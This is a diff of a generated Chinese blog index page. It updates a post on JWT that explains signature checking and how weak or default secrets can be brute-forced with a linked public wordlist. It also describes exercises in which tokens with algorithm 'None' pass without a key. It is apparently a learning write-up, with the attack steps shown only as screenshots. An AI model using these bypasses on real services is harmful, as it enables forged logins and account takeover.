+          <a class="article-more-a" href="/2025/03/31/PHP%E7%89%B9%E6%80%A7/">展开全文 >></a>
         </p>
       
 
@@ -1407,9 +1519,25 @@
     <article id="post-JWT" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2025/03/31/JWT/">JWT</a>
+    </h1>
+  
+
+        
+        <a href="/2025/03/31/JWT/" class="archive-article-date">
+  	<time datetime="2025-03-31T07:02:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-03-31</time>
+</a>
+        
+      </header>
+    
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="签名过程"><a href="#签名过程" class="headerlink" title="签名过程"></a>签名过程</h2><p><font style="color:rgb(51, 51, 51);">JWT(JSON Web Token)的签名验证过程主要包括以下几个步骤：</font></p>
+        <hr>
+<h2 id="签名过程"><a href="#签名过程" class="headerlink" title="签名过程"></a>签名过程</h2><p><font style="color:rgb(51, 51, 51);">JWT(JSON Web Token)的签名验证过程主要包括以下几个步骤：</font></p>
 <ul>
 <li><font style="color:rgb(51, 51, 51);">分离解构：JWT的Header和Payload是通过句点(.)分隔的，因此需要将JWT按照句点分隔符进行分离</font></li>
 <li><font style="color:rgb(51, 51, 51);">验证签名：通过使用指定算法对Header和Payload进行签名生成签名结果，然后将签名结果与JWT中的签名部分进行比较，如果两者相同则说明JWT的签名是有效的，否则说明JWT的签名是无效的</font></li>
@@ -1430,14 +1558,14 @@
 <p><font style="color:rgb(51, 51, 51);"></font></p>
 <p><font style="color:rgb(51, 51, 51);">在实现JWT应用程序时，开发人员有时会犯一些错误，比如：忘记更改默认密码或占位符密码，他们甚至可能复制并粘贴他们在网上找到的代码片段然后忘记更改作为示例提供的硬编码秘密，在这种情况下攻击者使用众所周知的秘密的单词列表来暴力破解服务器的秘密是很容易的，下面是一个公开已知密钥列表：</font></p>
 <p><a target="_blank" rel="noopener" href="https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list">https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list</a></p>
-<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="签名未校验"><a href="#签名未校验" class="headerlink" title="签名未校验"></a>签名未校验</h3><p><img src="/2025/03/26/JWT/1737008907369-b373555e-f498-4b18-845f-913b875ef085.png"></p>
-<p><img src="/2025/03/26/JWT/1737008917081-a47c6954-ecfc-42a9-8f3c-26fe70e143bc.png"></p>
+<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="签名未校验"><a href="#签名未校验" class="headerlink" title="签名未校验"></a>签名未校验</h3><p><img src="/2025/03/31/JWT/1737008907369-b373555e-f498-4b18-845f-913b875ef085.png"></p>
+<p><img src="/2025/03/31/JWT/1737008917081-a47c6954-ecfc-42a9-8f3c-26fe70e143bc.png"></p>
 <p>这边的算法显示为None，导致下面校验不成功。</p>
-<p><img src="/2025/03/26/JWT/1737008952868-bee44dad-0254-41bc-96c6-3f44c2c3acd8.png"></p>
+<p><img src="/2025/03/31/JWT/1737008952868-bee44dad-0254-41bc-96c6-3f44c2c3acd8.png"></p>
 <p>我们随便改一个，发现不需要密钥就能校验成功。</p>
-<p><img src="/2025/03/26/JWT/1737009011426-f953bbb3-9fc9-469f-b620-97d3a5705a69.png"></p>
+<p><img src="/2025/03/31/JWT/1737009011426-f953bbb3-9fc9-469f-b620-97d3a5705a69.png"></p>
 <p>将校验成功的拿去用就好了。</p>
-<h3 id="暴力破解密钥"><a href="#暴力破解密钥" class="headerlink" title="暴力破解密钥"></a>暴力破解密钥</h3><p><img src="/2025/03/26/JWT/1737010541090-5d7330c2-9cc8-4a85-95d2-a8af23b1a5da.png"></p>
+<h3 id="暴力破解密钥"><a href="#暴力破解密钥" class="headerlink" title="暴力破解密钥"></a>暴力破解密钥</h3><p><img src="/2025/03/31/JWT/1737010541090-5d7330c2-9cc8-4a85-95d2-a8af23b1a5da.png"></p>
 <p>成功爆破出密钥了。</p>
 
       
@@ -1451,7 +1579,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2025/03/26/JWT/">展开全文 >></a>
+          <a class="article-more-a" href="/2025/03/31/JWT/">展开全文 >></a>
         </p>
       
 
